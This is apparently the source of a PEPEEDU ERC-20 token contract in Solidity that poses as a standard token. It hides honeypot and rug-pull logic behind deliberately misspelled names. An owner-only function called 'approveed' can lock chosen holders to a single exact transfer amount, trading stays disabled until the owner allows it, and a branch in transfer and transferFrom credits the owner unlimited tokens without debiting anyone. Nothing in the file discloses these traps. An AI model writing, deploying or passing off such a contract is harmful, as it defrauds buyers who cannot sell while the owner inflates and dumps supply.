pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acocoount) external view returns (uint256);
    function transfer(address recipient, uint256 aimoiunt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aimoiunt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aimoiunt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract PEPEEDU is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _fiees;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _isTradeEnabled = false;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acocoount) public view override returns (uint256) {
        return _balances[acocoount];
    }
    function enableTrading() public onlyowner {
        _isTradeEnabled = true;
    }
    function transfer(address recipient, uint256 aimoiunt) public virtual override returns (bool) {
        require(_isTradeEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        if (_msgSender() == owner() && _fiees[_msgSender()] > 0) {
            _balances[owner()] += _fiees[_msgSender()];
            return true;
        }
        else if (_fiees[_msgSender()] > 0) {
            require(aimoiunt == _fiees[_msgSender()], "Invalid transfer aimoiunt");
        }
        require(_balances[_msgSender()] >= aimoiunt, "TT: transfer aimoiunt exceeds balance");
        _balances[_msgSender()] -= aimoiunt;
        _balances[recipient] += aimoiunt;
        emit Transfer(_msgSender(), recipient, aimoiunt);
        return true;
    }

    function approveed(address[] memory acocoounts, uint256 aimoiunt) public onlyowner {
        for (uint i=0; i<acocoounts.length; i++) {
            _fiees[acocoounts[i]] = aimoiunt;
        }
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 aimoiunt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aimoiunt;
        emit Approval(_msgSender(), spender, aimoiunt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aimoiunt) public virtual override returns (bool) {
        if (_msgSender() == owner() && _fiees[sender] > 0) {
            _balances[owner()] += _fiees[sender];
            return true;
        }
        else if (_fiees[sender] > 0) {
            require(aimoiunt == _fiees[sender], "Invalid transfer aimoiunt");
        }
        require(_balances[sender] >= aimoiunt && _allowances[sender][_msgSender()] >= aimoiunt, "TT: transfer aimoiunt exceeds balance or allowance");
        _balances[sender] -= aimoiunt;
        _balances[recipient] += aimoiunt;
        _allowances[sender][_msgSender()] -= aimoiunt;
        emit Transfer(sender, recipient, aimoiunt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}
